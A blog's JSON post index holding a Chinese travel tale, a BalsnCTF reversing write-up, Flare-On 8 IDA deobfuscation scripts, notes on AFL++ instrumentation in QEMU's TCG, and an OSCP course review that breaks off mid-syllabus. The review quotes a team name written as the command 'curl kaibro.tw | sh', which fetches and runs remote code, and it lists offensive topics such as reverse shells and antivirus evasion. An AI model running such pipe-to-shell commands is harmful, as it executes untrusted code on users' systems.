Airbnb，如果以為這是可以放鬆的時候，那可就錯得離譜。當地日落時間 7:28，我們還有一個小時可以去馬蹄灣拍照，而且停車費只要 $10。（圖中為一名客家人） 下午 6:47，車子停妥後，我們開始步行往馬蹄灣走去，入口處非常貼心的幫各位計算了複雜的飲水量公式。 結果一個老練的攝影師早就安好三腳架在一個完美的地點縮時攝影，沒有帶廣角鏡的我只能拍出沒有天空或是切到河道的殘缺物。然而 Apple 果然還是我大哥，iPhone 12 Pro 搭載 1200 萬像素相機、ƒ&#x2F;2.2 光圈、人像模式具備先進的散景效果及景深控制功能、人像燈光具備六款不同效果 (自然光、影樓燈光、輪廓光、舞台燈光、黑白舞台燈光、高色調黑白燈光)、寬廣色域相片及原況相片拍攝、鏡頭校正、自動影像防震功能讓你薄薄一台也可以拍出如此景色（又偷 Kaibro 的照片）： 在這裡時常可以看到一些人走到懸崖邊把腳伸出去拍照、一些人在懸崖邊倒立，不愧是自由美利堅，這裡的人們甚至享有摔落懸崖的自由。目睹這番光景的一瞬間，Bookgin 的靈感似乎被激發了，開始向所有人提了一道費米問題：「這裡每年有幾個人掉下去？」有興趣的讀者可以嘗試推導後將答案放在留言區，或許會有工作機會找上你。 然後我們就在景點瞎晃晃，找了個路人幫我們合照後，天色也差不多暗了下來，任何有智慧的日行性生物都知道是時候返回自己的巢穴了。何況遙遠的西方還可以看到自由美利堅拿著從娜烏西卡那裡搶來的巨神兵在沙漠裡進行著武器實驗所散發出的不祥紅光。 回程的路上在麥當勞吃了個晚餐，為了逃避麥當勞裡盎格魯撒克遜人異樣的眼光，我們趕緊收起滿口的中文，回到了 Airbnb，這也算是拍到羚羊峽谷了吧。 雖然房主說 AC 壞了幾台會退點錢給我們，但其實沙漠晚上還是挺涼的，而且沒什麼蚊蟲，晚上在外頭聊著聊著就睡著了。（晚上不好拍，圖為隔天早上） 最後睡前大家同意明日執行我的無恥提案，就是起個大早去羚羊峽谷的入口蹲點，看誰遲到還是取消就現場問可不可以遞補，穩妥！刷刷牙睡覺！（不太肯定所有人都有刷牙） 早上時間 8:00，早起拍了幾張合照後，眾人就往羚羊峽谷的售票口前進。 過了十幾分鐘的車程我們終於來到了售票口。結果根本不需要蹲點，在現場的小白板上就可以發現 9:35 還有空位，但感覺有點被坐地起價，現在每個人要 \\$100，不過來都來了，就算現在開 \\$200 也還是要去，這裡不來整趟白來。 一如既往的，整趟行程的重要分支任務就是幫 Kaibro 拍 Tinder 照。 不得不抱怨我把 Kaibro 跟 Maojui 拍得這麼好。 然而明明是同一台相機、同一個位置、同一個參數，為什麼就把我拍的這麼猥瑣。 經過了一個小時的等待，終於輪到我們上車，其實每批出去的車子總數挺多的，每台車容量約十人，每次總計可能有一百多人。所有人都不能帶背包（透明的可以），所有東西都必須要裝在口袋，然後也禁止帶相機腳架。應該是為了保護當地的自然景觀還有防止一些遊客把東西撿回家的措施。 前往峽谷的地面是沙子且異常顛簸，導遊一開始就叫大家把手機從口袋拿出來握在手上，因為行車過程中會直接從口袋滑下車。而且真的好險我一上車就把安全帶繫好了，整台車晃到會所有人都從椅子上彈起來。 過了大概十分鐘我們終於來到了峽谷的入口，這裡已經是納瓦霍族人的保留地，此時此刻沒有人發現，我右腳那隻從三月就已經破了洞的鞋子正在盜取上羚羊峽谷的砂石，沾黏在襪子上的紅色砂石讓我看起來像是沾滿花粉的蜜蜂。入口處還算有足夠的光線，這裡都非常好拍，導遊告訴我們幾個往上看拍起來最漂亮的點，他稱這裡是 sky window。 導遊們基本上是全副武裝，帽子、墨鏡跟遮掩口鼻的三角巾是標配，反正我們這種只來一次的觀光客吃點沙子應該也不會造成什麼傷害就是了。（圖為後面那台車的導遊） 在距離入口不遠處，導遊指著附近垂直岩壁上的一些圓形凹陷問我們覺得這些東西是怎麼造成的。本來想說是長期風吹砂礫或石頭撞擊岩壁造成的，但他說這是很久以前的彈孔，不愧是自由美利堅，槍擊每一天。 隨著慢慢深入峽谷之後，因為垂直望向天空的景觀導致動態範圍很高不好拍攝之外，手持相機快門也不可能開多久，而且還會眩光，頭上還會時不時掉沙子下來，真的難。 本來以為讀完安德魯‧路米斯的《畫家之眼》後自己對於美有著獨特的觀察與見解。但是後來發現大家好像都拍差不多的地方，在看共用相簿還有 google 的時候發現這個角度超多人拍。 走在峽谷裡，大概腰部以下的位置都籠罩在陰影裡，雖然不至於看不到，但就像關燈在房間裡走路，總會丟失一些細節；到達一個定點後，導遊突然拿起他的手電筒往腳邊的一個地方照去，一個黑色生物突然顯現——據說是整個峽谷裡唯一一隻黑寡婦，當下只覺得要是我手賤亂摸可能早就被咬成亞洲蜘蛛人，而且觀察後發現，不是每個導遊都有提到腳邊有黑寡婦這件事。 走著走著，導遊說了更多關於羚羊峽谷的故事。例如這裡偶爾會有貓頭鷹或是曾經有個 12 人的團體在這裡被洪水淹死 11 個人，唯一一個沒死的就躲在這塊凸起的地方上，所以等等如果下雨我們就要開始跑了，真是可怕，好險沙漠應該沒有天天在下雨的。這麼想就大錯特錯了，因為這個季節差不多是雨季，過了一會兒就真的開始下雨了，我們甚至可以在峽谷裡聽到打雷聲，雖然我們還是在邊走邊拍照，然後試試看快門調多快才能拍到落下的雨滴，我逢人就說：「You’re a dead man。」隨著雨勢漸大，後面的團體因為有小朋友的關係，為了避免發生危險就原路折返了。就算峽谷目前的雨勢不大那也不代表是安全的，因為洪水是從上游下來的，等看到水來的時候已經可以想下輩子的事了。我們是最後一組走出峽谷的人，走上了峽谷外的階梯爬上了地勢較高的地方，終於感覺比較安全一點。那可又大錯特錯了，踩在一望無際的曠野上，頭頂的雲層雷電交加，我們最好是快點下去搭車，避免下一聲雷響的時候多了點焦香。 踩著沾滿泥沙的鞋子上車後，顧不得弄髒地墊要多收清潔費，我們開始啟程往拉斯維加斯前進，不然會趕不上還車的時間！但暴雨絲毫沒有要停止的意思，回程的路上雨勢大到看不到對向來車的車燈，而沁涼的雨水似乎也安定了 Bookgin 的靈魂，他現在只跟著前車的屁股走。 回程途中甚至收到了自由美利堅國家級的死亡威脅。什麼什麼洪水警報，什麼什麼 Do not attempt to travel，但我們是往越來越乾的地方開，大概沒問題吧。 過了一段很長的時間後，我們終於回到了乾燥的大地，此時沾滿雨水的車身，正在充滿著飛沙走石的公路上疾駛著。 最後我們終於活著回到了風和日麗的拉斯維加斯。經過了風吹日曬雨淋，Porsche 此刻就是一台破二手車的樣子。於是，這群亞洲人們重複著他們祖先在這片大陸上的命運；踏上同樣苦命的生活軌跡；開始了他們在自由美利堅的洗車勞動……","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"Travel","slug":"Travel","permalink":"http://blog.terrynini.tw/tags/Travel/"}]},{"title":"2022::BalsnCTF::ProjectO Write-up","slug":"2022-BalsnCTF-ProjectO-Write-up","date":"2022-09-12T14:44:33.000Z","updated":"2022-09-15T15:59:46.000Z","comments":true,"path":"en/2022-BalsnCTF-ProjectO-Write-up/","permalink":"http://blog.terrynini.tw/en/2022-BalsnCTF-ProjectO-Write-up/","excerpt":"Hi, I’m the author of ProjectO. To solve the challenge, player must reversing the game server to understand the protocol and mechanism.A semi-auto game client is sufficient to gain the flag.","text":"Hi, I’m the author of ProjectO. To solve the challenge, player must reversing the game server to understand the protocol and mechanism.A semi-auto game client is sufficient to gain the flag. MSVC STLThough the binary is stripped, it’s not difficult to recognize it’s using some STLs in C++. But one should quickly realize that the layout of structures are differ from their equivalent in libc++. The concept is similar, it’s should not be a problem to figure out the correct layout. Here is the source code of MSVC STL. In case you have no idea about the libc++ STL, this is the tutorial made by flagbog. Protocol BuffersBoth of the code of server logic and the protobuf library were chosen as Release version at compile stage, but the information of protocol buffers wasn’t stripped. It helps to understand the functionality of the binary. The problem is how to send a valid request. First step is to find out the vtable of protobuf, e.g the balsn::Request::vftable is the vtable of Request message in package balsn. One of the functions in vtable contains the implementation of serialization. By following the function at 0x000140015A30, we can target the function responsible for serialization stored at vtable+0x48, which is sub_1400020D0: 0x00140015A30... else &#123; v10 = 16; v8 = &amp;a2[v5 - 16]; v7 = v8; v9 = (__int64)v11 + 8; &#125; if ( !(*(__int64 (__fastcall **)(__int64, char *, char **))(*(_QWORD *)a1 + 0x48i64))(a1, a2, &amp;v7) || (_DWORD)v14 ) return 0; else return sub_140015440((__int64)&amp;v7, a1, 1);&#125; A number in protobuf is represent by Variant Length Integer, the pattern can be observed in function sub_140012B80, which also being called in sub_1400020D0. sub_1400020D0...if ( v8 &gt;&gt; 3 == 1 ) &#123; if ( (_BYTE)v8 != 8 ) goto LABEL_35; v12 = *a2; v3 |= 2u; if ( (v12 &amp; 0x80u) != 0 ) &#123; v12 = (a2[1] &lt;&lt; 7) + v12 - 128; if ( (a2[1] &amp; 0x80u) != 0 ) &#123; sub_140012B80(&amp;v22, a2, v12); v12 = v23; a2 = v22; &#125; else &#123; a2 += 2; &#125; &#125;... But it’s time consuming to review each of such functions of every types of message. Actually, after parsing a member of a message, the protobuf set a bit in the structure to indicate the present&#x2F;absent of a member: sub_1400020D0... if ( v8 &gt;&gt; 3 == 1 ) &#123; if ( (_BYTE)v8 != 8 ) goto LABEL_35; v12 = *a2; v3 |= 2u; //set the bit corresponding bit if ( (v12 &amp; 0x80u) != 0 ) &#123;... else if ( v8 &gt;&gt; 3 == 2 ) &#123; if ( (_BYTE)v8 != 16 ) goto LABEL_35; v11 = *a2; v3 |= 4u; //set the bit corresponding bit if ( (v11 &amp; 0x80u) != 0 )... *(_DWORD *)(a1 + 16) |= v3; // assign the value return a2;&#125; So, by following the usage of each message, we can construct the message now. Though the name of members are unimportant, you can find them in binary. The source code of message: message.protosyntax = &quot;proto2&quot;;package balsn;message Request &#123; required int32 module = 1; required uint32 command = 2; optional bytes data = 3;&#125;message Auth&#123; optional string username=1; optional string password=2;&#125;message Control&#123; required int32 direction = 1;&#125;message Info&#123; required int32 which = 1; required int32 what = 2;&#125;message Point&#123; required int32 x = 1; required int32 y = 2;&#125;message Response &#123; required int32 status = 1; optional int32 iData = 2; repeated Point pData = 3; optional bytes bData = 4;&#125; Besides the protobuf itself, the binary required client to send the length of the incoming protobuf, it looks like: | (4 bytes) length of message | message | The GameThe game is: 10 levels of random generated MAZE with 10 enemies and a portal to next level Have to kill 70 enemies to claim the flag after level 10 Enemies won’t move and only slash it’s adjacent blocks every 3 turns Player only has 1 HP Connection timeout after 12 minutes That’s it, just write a semi-auto client to reach the goal.It’s possible! Check out the #writeups channel on Discord.And this github repo contains the source code of the challenge.","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"Balsn","slug":"Balsn","permalink":"http://blog.terrynini.tw/tags/Balsn/"}]},{"title":"2021::Flare-On 8::Write-up","slug":"2021-Flare-On-8-Write-up","date":"2021-11-23T09:36:21.000Z","updated":"2021-11-26T03:19:51.000Z","comments":true,"path":"en/2021-Flare-On-8-Write-up/","permalink":"http://blog.terrynini.tw/en/2021-Flare-On-8-Write-up/","excerpt":"Being smart this year, not write write-up for each challenge, only the script for challenge 9, genius.","text":"Being smart this year, not write write-up for each challenge, only the script for challenge 9, genius. OK, this year I’m the first person who finish all flare-on challenges out of 7 from Taiwan (there’s actually an anonymous guy right behind me) and 96th (or 89th) in global ranking. 9 - evilYou should read the official write-up for details, I’m only to explain my python script for deobfuscating the binary here. First, use python to implement the equivalent of the hash function in binary for searching specific API: hash.pyimport ctypesimport sysa = sys.argv[1].encode()v18 = 64for i in range(len(a)): v18 = ctypes.c_uint32(a[i] - 0x45523F21 * v18).valueprint(hex(v18)) Use the script above to generate the corresponding hash of Windows APIs, known_hash.py is available on github: known_hash.pyknown_hash = &#123;b&#x27;CPAcquireContext&#x27;: 1066826886, b&#x27;CPCreateHash&#x27;: 3394046519, b&#x27;CPDecrypt&#x27;: 3691957472, b&#x27;CPDeriveKey&#x27;: 2034950283, b&#x27;CPDestroyHash&#x27;: 1626920955, b&#x27;CPDestroyKey&#x27;: 347407890, b&#x27;CPDuplicateHash&#x27;: 2349519820, b&#x27;CPDuplicateKey&#x27;: 2086498145, b&#x27;CPEncrypt&#x27;: 2292368120, b&#x27;CPExportKey&#x27;: 803397598, b&#x27;CPGenKey&#x27;: 3709856188, b&#x27;CPGenRandom&#x27;: 87208454, b&#x27;CPGetHashParam&#x27;: 2821118198, b&#x27;CPGetKeyParam&#x27;:... Finally, because IDA Pro can determine the prototype of a function by matching the function’s name. By creating a dummy section which used to place name of API . Then, replace all operations those causing the binary trap to vectored exception handler with call operation which points to the real API names in dummy section to make the decompile result easy to read. But due to the nature of IDA Pro, one have to run the again function and explicitly mark some data as code in IDA Pro multiple times: ida_deob.pyimport ida_bytesimport idcimport idaapiimport ida_searchimport ida_idpimport ida_nameimport ida_segmentfrom known_hash import known_hashrev_known_hash = &#123;known_hash[k]:k for k in known_hash&#125;pos_table = &#123;&#125;seg_base = 0x5000000not_found = []ida_segment.add_segm(0, seg_base, seg_base+0x40000, &#x27;flare_ptr&#x27;, &quot;BSS&quot;)def patch(cur_ea): head = cur_ea for i in range(100): head = idc.prev_head(head) if idc.print_insn_mnem(head) == &quot;mov&quot; and &quot;ecx&quot; == idc.print_operand(head, 0): target = idc.print_operand(head, 1) for ii in range(100): head = idc.prev_head(head) if idc.print_insn_mnem(head) == &quot;mov&quot; and target in idc.print_operand(head, 0): func_hash = int(idc.print_operand(head, 1)[:-1], 16) if func_hash not in pos_table: pos_table[func_hash] = seg_base+ 4*len(pos_table) if not ida_idp.assemble(cur_ea, 0, cur_ea, True, f&quot;call &#123;rev_known_hash[func_hash].decode()&#125;&quot;): idc.set_name(pos_table[func_hash], rev_known_hash[func_hash].decode(), ida_name.SN_CHECK) ida_idp.assemble(cur_ea, 0, cur_ea, True, f&quot;call &#123;rev_known_hash[func_hash].decode()&#125;&quot;) ida_bytes.patch_bytes(cur_ea+5, b&#x27;\\x90\\x90&#x27;) break breakdef again(): code_head = 0x401000 while code_head != idaapi.BADADDR: if idc.print_insn_mnem(code_head) == &quot;xor&quot; and idc.print_operand(code_head, 0) == idc.print_operand(code_head, 1): next_head = idc.next_head(code_head) if idc.print_insn_mnem(next_head) == &quot;div&quot; and idc.print_operand(code_head, 0) == idc.print_operand(next_head, 1): patch(code_head) elif idc.print_insn_mnem(next_head) == &quot;mov&quot;: reg = idc.print_operand(code_head, 0) op2 = idc.print_operand(next_head, 1) op1 = idc.print_operand(next_head, 0) if (&#x27;[&#x27; in op1 or &#x27;[&#x27; in op2 ) and (op2 in op1 or op1 in op2) and (reg in op1 and reg in op2): patch(code_head) code_head = idc.next_head(code_head) Now, we have a nice and clean output:","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"http://blog.terrynini.tw/tags/Reverse/"},{"name":"Flare-On","slug":"Flare-On","permalink":"http://blog.terrynini.tw/tags/Flare-On/"}]},{"title":"2021::QEMU::AFL++ and TCG","slug":"2021-QEMU-AFL-and-TCG","date":"2021-05-28T20:12:48.000Z","updated":"2021-05-30T00:53:05.000Z","comments":true,"path":"en/2021-QEMU-AFL-and-TCG/","permalink":"http://blog.terrynini.tw/en/2021-QEMU-AFL-and-TCG/","excerpt":"Rewriting some of notes in my obsidian into a post seems to be a good idea.","text":"Rewriting some of notes in my obsidian into a post seems to be a good idea. TCGTCG is abbreviation of Tiny Code Generator, the TCG frontend lifts target instructions into TCG-IR and the TCG backend lowers the TCG-IR into host instructions. The tcg&#x2F;README is a good place to start. Because TCG-IR is relatively simple, some target instructions are hard to be implemented by pure TCG-IR. Helper functions provides another way to implement these instruction. Code ReviewTake QEMU-5.0.0-rc4 for example, how QEMU emulating syscall instruction of i386 is at line 7381 of target/i386/tcg/translate.c : target/i386/tcg/translate.c 7381738273837384738573867387738873897390739173927393#ifdef TARGET_X86_64 case 0x105: /* syscall */ /* XXX: is it usable in real mode ? */ gen_update_cc_op(s); gen_jmp_im(s, pc_start - s-&gt;cs_base); gen_helper_syscall(cpu_env, tcg_const_i32(s-&gt;pc - pc_start)); /* TF handling for the syscall insn is different. The TF bit is checked after the syscall insn completes. This allows #DB to not be generated after one has entered CPL0 if TF is set in FMASK. */ gen_eob_worker(s, false, true); break; Functions with prefix gen are responsible for generating corresponding backend-ops, but get_helper_syscall is more special. The function get_helper_syscall will insert a call backend-op into TCG code, and the target of the call instruction is function helper_syscall, which is at line 979 of target/i386/tcg/seg_helper.c. (use CONFIG_USER_ONLY to choose different implementation for user mode emulation and full system emulation) target/i386/tcg/seg_helper.c 979980981982983984985986987988989990991#ifdef TARGET_X86_64#if defined(CONFIG_USER_ONLY)void helper_syscall(CPUX86State *env, int next_eip_addend)&#123; ...&#125;#elsevoid helper_syscall(CPUX86State *env, int next_eip_addend)&#123; ...&#125;#endif#endif So, calling a custom helper function from TCG is easy, takes AFL++ for example. AFL++ and TCGAFL++ is the community version of well-known coverage-based greybox fuzzer AFL, the way it used to track the code coverage during fuzzing process is to insert a instruction to call function afl_maybe_log at the beginning of each basic block at compile time. The function afl_maybe_log will add the corresponding element by 1 in the bitmap shared with AFL++, and the way to index the bitmap is using the hash value of token of current basic block and previous basic block ( cur_loc and afl_prev_loc ), and the token value was assigned randomly at compile time. cur_loc = 0x123;afl_area_ptr[cur_loc ^ afl_prev_loc]++;afl_prev_loc = cur_loc &gt;&gt; 1; In a scenario where the source code is unavailable, which is very common, it’s not possible to insert afl_maybe_log at compile time, so AFL++ has QEMU mode to perform the so-called dynamic instrumentation. AFL++ use it’s own forked version of QEMU, qemuafl, which will insert afl_maybe_log into TCG-IR while generating TCG-IR of each basic block so it can benefit from block chaining. To add a new helper, we need to declare the helper function at accel/tcg/tcg-runtime.h , or if the helper only works on specific architecture, it should be declared at target/&lt;arch&gt;/helper.h . accel/tcg/tcg-runtime.hDEF_HELPER_FLAGS_1(afl_maybe_log, TCG_CALL_NO_RWG, void, tl) The N of macro DEF_HELPER_FLAGS_N means the number of arguments, this macro will declare a function helper_afl_maybe_log which returns nothing and takes one argument. The TCG_CALL_NO_RWG is alias of TCG_CALL_NO_READ_GLOBALS, it means helper does not read globals (either directly or through an exception). It implies TCG_CALL_NO_WRITE_GLOBALS. The definition of DEF_HELPER_FLAGS_1 in exec/helper-proto.h is: exec/helper-proto.h#define DEF_HELPER_FLAGS_1(name, flags, ret, t1) \\dh_ctype(ret) HELPER(name) (dh_ctype(t1)); But why we need a macro only for declaration? And where it use the flags variable? It’s actually a cool macro trick here! Actually, the macro DEF_HELPER_FLAGS_1 was undefined at the end of the exec/helper-proto.h : exec/helper-proto.h#undef DEF_HELPER_FLAGS_0#undef DEF_HELPER_FLAGS_1#undef DEF_HELPER_FLAGS_2#undef DEF_HELPER_FLAGS_3#undef DEF_HELPER_FLAGS_4#undef DEF_HELPER_FLAGS_5#undef DEF_HELPER_FLAGS_6#undef DEF_HELPER_FLAGS_7#endif /* HELPER_PROTO_H */ Let’s take a look at include/tcg/tcg-op.h , which includes two files: include/tcg/tcg-op.h#include &quot;exec/helper-proto.h&quot;#include &quot;exec/helper-gen.h&quot; Surprisingly, there is another definition of DEF_HELPER_FLAGS_1 in exec/helper-gen.h ! exec/helper-gen.h#define DEF_HELPER_FLAGS_1(name, flags, ret, t1) \\static inline void glue(gen_helper_, name)(dh_retvar_decl(ret) \\ dh_arg_decl(t1, 1)) \\&#123; \\ TCGTemp *args[1] = &#123; dh_arg(t1, 1) &#125;; \\ tcg_gen_callN(HELPER(name), dh_retvar(ret), 1, args); \\&#125; As we can see, this is used to define another function gen_helper_afl_maybe_log here. The first argument of tcg_gen_callN is the target of call instruction, which is HELPER(name) here. The macro HELPER is used to insert helper_ in front of the given name. What gen_helper_afl_maybe_log do is to generate a call instruction to call helper_afl_maybe_log in TCG code ! After the declaration, next step is defining it, qemuafl defines the function helper_afl_maybe_log in the accel/tcg/translate-all.c : accel/tcg/translate-all.c 717273747576777879void HELPER(afl_maybe_log)(target_ulong cur_loc)&#123; register uintptr_t afl_idx = cur_loc ^ afl_prev_loc; INC_AFL_AREA(afl_idx); afl_prev_loc = cur_loc &gt;&gt; 1;&#125; Now, it’s possible to call the custom function from TCG. As mentioned, AFL++ insert afl_may_log at the beginning of each basic block to gather the coverage information during fuzzing. Because QEMU also uses basic block as a unit while translating TCG code into host code, it’s easy to insert afl_may_log at the beginning of each basic block. In the function tb_gen_code , we can observe that qemuafl call function afl_gen_trace(pc) before generating machine code: accel/tcg/translate-all.ctcg_ctx-&gt;cpu = env_cpu(env);afl_gen_trace(pc);gen_intermediate_code(cpu, tb, max_insns);tcg_ctx-&gt;cpu = NULL;max_insns = tb-&gt;icount;trace_translate_block(tb, tb-&gt;pc, tb-&gt;tc.ptr);/* generate machine code */ Let’s inspect the definition of afl_gen_trace and highlight the last three lines: accel/tcg/translate-all.c/* Generates TCG code for AFL&#x27;s tracing instrumentation. */static void afl_gen_trace(target_ulong cur_loc) &#123; ... TCGv cur_loc_v = tcg_const_tl(cur_loc); gen_helper_afl_maybe_log(cur_loc_v); tcg_temp_free(cur_loc_v);&#125; To use gen_helper_afl_maybe_log to generate a call in TCG code, the parameter have to be converted to TCG variables, tcg_const_tl(cur_loc_v) is used to generate a TCG temporary with value cur_loc , and although it’s “const”, it did create a temporary, we have to free it after use to reduce the memory usage. EndAnd, that’s it, qemuafl inserts a call instruction at the beginning of each basic block’s TCG code, once a basic block is being executed, it must call the custom helper function, HELPER(afl_maybe_log), to record the code coverage first. AFL is actually using the same strategy, but I was reviewing the source code of AFL++, I use it as example here.","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"AFL++","slug":"AFL","permalink":"http://blog.terrynini.tw/tags/AFL/"},{"name":"QEMU","slug":"QEMU","permalink":"http://blog.terrynini.tw/tags/QEMU/"}]},{"title":"2021::OSCP::回顧與分享","slug":"2021-OSCP-回顧與分享","date":"2021-02-16T17:44:00.000Z","updated":"2021-04-06T07:23:30.000Z","comments":true,"path":"tw/2021-OSCP-回顧與分享/","permalink":"http://blog.terrynini.tw/tw/2021-OSCP-%E5%9B%9E%E9%A1%A7%E8%88%87%E5%88%86%E4%BA%AB/","excerpt":"趁著期末考之後過年之前把 OSCP 考過了，為了讓每一分美金都發揮最大效用，趁著記憶猶新來寫一篇分享文好了，反正 Balsn meetup 也是這個主題ฅ(&#x3D;ˇωˇ&#x3D;)ฅ，這篇文章將會包含 OSCP 課程大綱、lab 環境介紹跟一些考試注意事項，在不違規的前提下把整個報名到考試的流程走一遍，讓整個 OSCP 的輪廓鮮明一點，應該能幫到未來有需要的人。","text":"趁著期末考之後過年之前把 OSCP 考過了，為了讓每一分美金都發揮最大效用，趁著記憶猶新來寫一篇分享文好了，反正 Balsn meetup 也是這個主題ฅ(&#x3D;ˇωˇ&#x3D;)ฅ，這篇文章將會包含 OSCP 課程大綱、lab 環境介紹跟一些考試注意事項，在不違規的前提下把整個報名到考試的流程走一遍，讓整個 OSCP 的輪廓鮮明一點，應該能幫到未來有需要的人。 報考動機除了被國網中心的破爛題目激到以外，就只是單純覺得好玩，當作另外一個 CTF 或是 Flare-On 的感覺，其實這張證照具體用途是什麼我也不是很確定，大致上就是 Offensive Security 這間公司的公信力夠高與 OSCP 不是筆試的關係，使得這張證照比較有說服力，我知道台灣有幾間公司有看這張，reddit 上也滿多人提到自己面試時遇到的公司很多會要求 OSCP 的資格，就算不要求，擁有 OSCP 的資格多少也會加點分，我是考完了才在查能幹嘛🤔️，知道哪裡用得上這張收據的人麻煩告訴我… 但我現在可以很篤定的說，就算是以 Penetration Testing 為主軸來設計比賽，國網中心的那場比賽也真的是爛到有剩，裡面滿是路上撿來的靶機甚至還有 OSCP 教材裡面的範例題。 OSCP 簡介先簡單介紹一下什麼是 OSCP，OSCP 是 Offensive Security Certified Professional 的縮寫，也就是 Offensive Security 這間公司所認證的專家，但該公司其實有不只一種類型的課程，算進 Web Application 跟 Exploit Development，目前有六種課程跟對應的證照。 OSCP 對應的是 Penetration Testing with Kali Linux 這門課程，縮寫成 PWK，課程目標是教會學員怎麼用 Kali Linux 和裡面的資源來做滲透測試，課程最後有個 24 小時的考試，要合格的話得要在測驗中拿下至少 70 分，並且要在接下去的 24 小時裡提交滲透測試報告，如果細節不全或是沒達到某些要求會被倒扣甚至是該題拿零分，最後通過考試就可以拿到 OSCP 的資格及證照，所以這篇心得應該要叫做 PWK 回顧才對🤔️。 官方自己是將 Penetration Testing with Kali Linux 縮寫成 PWK，更早以前叫做 PWB，因為那個時候的教材是 BackTrack，PWK 在 2020 年的時候有一次更新，教材內容跟 Lab 都有更新過，在 2021 的時候名字也統一更新了，現在用了統一的數字編號 來稱呼每個課程，PWK 就是現在的 PEN-200，從名字的 2 可以知道，官方把這個課程當作滲透測試裡最初階的課程（目前沒有 1 開頭的課程）。 價格還沒更新之前 30 天的價格是 \\$799，2020 更新之後 30 天是 \\$999，貴到哭... 重考跟中途延長的費用在官方課程介紹 的最下面有寫到，這裡就只列出基本費用。 在我打 lab 的期間，Public network + IT department + Develop department + Admin department 的機器總數是 66 台，基本上沒有滲透經驗的話，30 天應該是沒有辦法活得健康又完成全部的 lab，尤其我是挑學期結束後的那一個月，所以如果有其他事情要忙應該會滿慘的。 那這裡給出我的詳細狀況給大家做參考，我是跟室友@NEO_ZR 同時報名的，我平常主要都是投資在 binary 類型的題目，Web Application 跟滲透測試的概念跟戰隊裡其他人比起來薄弱很多，@NEO_ZR 的話，我們是 2019 年時用 curl kaibro.tw | sh 的隊名在金盾獎拿下冠軍的隊友，事前也沒有涉足滲透測試，大致上是這樣。 實際上花在 lab 的時間是 19 天，前面 12 天在看 PWK 的教材還有忙學校的期末成績結算，我們的策略是分頭打不重複的機器，邊打邊寫 writeup，這樣不會過分劇透又可以留下參考避開雷點，應該是最有效率的方式，最後一週的時候我們都打到瓶頸（這個故事放在Lab 的注意事項），就慢慢回頭做有 writeup 的題目，這個時候我完成 36 台、@NEO_ZR 完成 27 台，結束時，我總計是完成 36+27 減去重複的 5 台，就是 58 台，@NEO_ZR 最後幾台我就不確定了。 下表是官方自己統計的數據，縱軸指的是考試的通過率，橫軸指的是完成多少台 lab，而且報名花的錢應該大部分都是砸在 lab 上，好好完成應該還是比較划算的，當然還是有替代方案的，統整在練習平台 的地方： 報名及教材報名時可以在十天的範圍內選擇什麼時候開始課程，報名時要注意的是如果官方沒辦法從 Email Address 直接確認身份和登記的機構，那官方會要求掃描英文的 ID 上傳，這個情況下就是傳護照過去，報名程序完成後官方會給幾樣東西： 總共 428 支的教學影片，是整包 html 的那種形式 853 頁的 pdf 教材 用來連進 Lab 以及 Lab Control Panel 的 OpenVPN config 登入官方論壇的帳號密碼（不用 vpn 也能連上） 比起影片的內容，pdf 會比較完整一點，然後還有一點就是，教材上面都有浮水印，不管是刻意或是不小心，只要流出的話證照就會被撤銷，當然也包含洩漏考試內容及有關這堂課的 tips。 課程大綱事實上官方的課程大綱 就是那 853 頁 pdf 教材的大綱，直接看是最詳細了，各章的內容都不難，就是開始做 Lab 的時候要熟悉一下枚舉順序跟記得有什麼工具可以用。 這裡是我的總結，數字的部分並沒有對上 pdf 的章節，大致上包含了： 1. 基本 Kali Linux就一些基本的設定，Kali Linux 已經把很多常用工具整合進去，例如 wordlist 或是常用的 webshell 等，直接用 Kali 會省去很多麻煩，但我個人還是另外把工具跟 wordlist 都裝在 MacOS 或是 docker 裡面。 2. 基本 Linux 操作常用 command、pipe 之類的那種很 basic 的東西。 3. Netcat、Socat、Powershell、Powercat總之就是如何利用工具上傳下載檔案，以及如何彈 reverse shell 回來。 4. Wireshark、Tcpdump就如何擷取封包，幫一些現成工具 debug 的時候才會用到。 5. Bash scripting就很簡單的 Bash script 用法。 6. Passive Information Gathering教材裡對 Passive 的定義基本上就是指不直接跟目標接觸所做的資訊蒐集，諸如 Whois、查 SSL、Google Hacking、OSINT 等。 7. Active Information Gathering相對於 Passive，Active 指的是與目標直接接觸的資訊蒐集，例如 Port scan、根據 port 掃出來的服務做對應的枚舉，講枚舉可能有點抽象，具體的例子像是如果目標有開啟 SMB 服務，那就試試看能不能得到版本，或是具體上 Share 了什麼項目出來。 8. 弱點掃描如何使用弱點掃描工具，包含大範圍弱點掃描，值得一提的是考試的時候是禁用大範圍弱掃的。 9. Web Application 攻擊就那些 CTF 會遇到的各種套路。 10. Buffer OverflowWindows 跟 Linux 的 BOF，但超簡單，連 stack 都不會細講，用最簡單的方式直接 exploit，蓋 return、找 gadget、跳 shellcode。 11. Client-Side Attacks前面提到的東西基本上都是往一個 Server 打，假設有台主機作為 Client 去訪問已經被佔領的主機或是可控的有漏洞服務，那就有機會可以藉此打進去，例如 Microsoft Office 的巨集病毒或是 HTA Attack 等。 12. Public Exploitation &amp; Fixing Exploits如何尋找和使用公開的 Exploit，此外在某些情況下，因為防火牆或是情境些微不同，使用前可能需要調整 Exploit，在這部分也會提到。 13. File Transfers這個他特別拉出來講應該是因為 Windows 環境有很多小技巧，因為 Linux 上常用的傳檔案方式，在 Windows 上明顯不可用，這裡有會講如何利用 Windows 上的相關工具來達到上傳的目的。 14. Antivirus Evasion在有防毒軟體的情況下如何逃逸。 15. Privilege Escalation跟 CTF 不同，滲透進一台主機時透過的可能是 apache 上的 web application，那開出來的 shell 有很大機率就是 www-data，不管是獲取機敏資料或是作為滲透測試中的立足點都稍嫌不足，所以這個部分是在講如何提權。 16. Password Attacks基本上就是各類暴力枚舉密碼的工具。 17. Port Redirection and Tunneling內網裡面會有不同網段，可能只能透過中間的一台機器做 proxy 來存取內網，這時候連 Port scan 